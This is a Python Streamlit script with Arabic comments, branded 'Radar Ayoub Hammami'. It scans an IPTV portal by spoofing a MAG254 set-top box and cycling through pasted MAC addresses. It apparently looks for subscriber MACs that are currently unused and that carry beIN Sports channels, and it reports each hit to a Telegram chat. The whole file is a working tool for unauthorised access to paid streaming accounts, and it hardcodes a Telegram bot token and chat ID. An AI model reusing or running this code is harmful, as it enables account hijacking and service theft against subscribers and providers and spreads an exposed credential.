import streamlit as st
import requests
import time
import telebot
import random
import re

# بياناتك الثابتة
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الكلمات المفتاحية للقنوات المطلوبة
CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# إعداد الصفحة مع اسمك
st.set_page_config(page_title="Radar Ayoub Hammami", page_icon="📡")
st.markdown(f"<h1 style='text-align: center; color: #FF4B4B;'>📡 Radar Ayoub Hammami</h1>", unsafe_allow_html=True)
st.markdown(f"<p style='text-align: center; font-weight: bold;'>نظام المسح الذكي للمحترفين</p>", unsafe_allow_html=True)

# صندوق إدخال البيانات
raw_data = st.text_area("انسخ هنا النص العشوائي (روابط وماكات مبعثرة)", height=200)

if st.button("🚀 بدء المسح الشامل"):
    if raw_data:
        # استخراج الماكات والرابط بذكاء (تجنب التكرار)
        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
        
        if host_match and macs:
            host = host_match.group(0).split('/portal.php')[0].strip('/')
            clean_host = host.replace("http://", "").replace("https://", "").split('/')[0]
            
            st.success(f"✅ بورتال: `{clean_host}` | الأهداف المستخرجة: `{len(macs)}`")
            
            # --- لوحة العدادات المباشرة ---
            col1, col2, col3 = st.columns(3)
            stat_total = col1.metric("إجمالي الأهداف", len(macs))
            stat_checked = col2.empty()
            stat_found = col3.empty()
            
            found_count = 0
            checked_count = 0
            
            # إرسال بداية التشغيل مع اسمك لتلغرام
            bot.send_message(ID, f"📡 **Radar Ayoub Hammami**\n\n🚀 بدأ الرادار بالتناوب الآن على سيرفر:\n🌐 `{clean_host}`\n📦 عدد الماكات: {len(macs)}")

            placeholder = st.empty()
            
            while True:
                # تصفير عداد الدورة الحالية عند كل بداية جديدة
                temp_checked = 0
                for current_mac in macs:
                    temp_checked += 1
                    checked_count += 1 # العداد الكلي
                    
                    # تحديث العدادات على الشاشة
                    stat_checked.metric("إجمالي الفحوصات", checked_count)
                    stat_found.metric("الصيد الذهبي", found_count)
                    
                    placeholder.info(f"🔎 يفحص الآن ({temp_checked}/{len(macs)}): {current_mac}")
                    
                    headers = {'User-Agent': 'MAG254', 'Cookie': f'mac={current_mac}'}
                    base_url = f"http://{clean_host}/portal.php"
                    
                    try:
                        # فحص الحالة والارتباط
                        url_prof = f"{base_url}?type=stb&action=get_profile&force_stb=1"
                        start = time.time()
                        r_prof = requests.get(url_prof, headers=headers, timeout=7)
                        latency = (time.time() - start) * 1000
                        
                        if r_prof.status_code == 200:
                            match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r_prof.text)
                            active = match.group(1) if match else "0"

                            # إذا وجدنا ماك فارغ (0 متصل)
                            if active == "0":
                                found_count += 1
                                # فحص القنوات المفضلة
                                url_ch = f"{base_url}?type=itv&action=get_all_channels"
                                r_ch = requests.get(url_ch, headers=headers, timeout=7)
                                ch_text = r_ch.text.upper()
                                
                                found_channels = [f"✅ {n}" for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
                                stab = "قوي ✅" if latency < 1000 else "متقطع ⚠️"
                                
                                # تنبيه التلغرام مع توقيعك
                                alert = (
                                    f"🎯 **صيد متاح بواسطة Radar Ayoub**\n\n"
                                    f"🖥️ الماك: `{current_mac}`\n"
                                    f"📊 الاستقرار: {stab}\n"
                                    f"👥 المتصلون: `0`\n"
                                    f"📺 القنوات:\n" + ("\n".join(found_channels) if found_channels else "❌ القنوات المفضلة غير متاحة") +
                                    f"\n\n👤 المالك: Ayoub Hammami"
                                )
                                bot.send_message(ID, alert, parse_mode="Markdown")
                                st.balloons() # احتفال بسيط عند الصيد
                    except:
                        pass
                    
                    time.sleep(1.2) # سرعة الفحص مع حماية من الحظر

                placeholder.warning("🔄 انتهت الدورة.. إعادة المسح التلقائي...")
                time.sleep(10)
        else:
            st.error("❌ عذراً أيوب، لم أجد رابط سيرفر أو ماكات صالحة في النص.")
    else:
        st.warning("⚠️ الصندوق فارغ! ضع البيانات أولاً.")
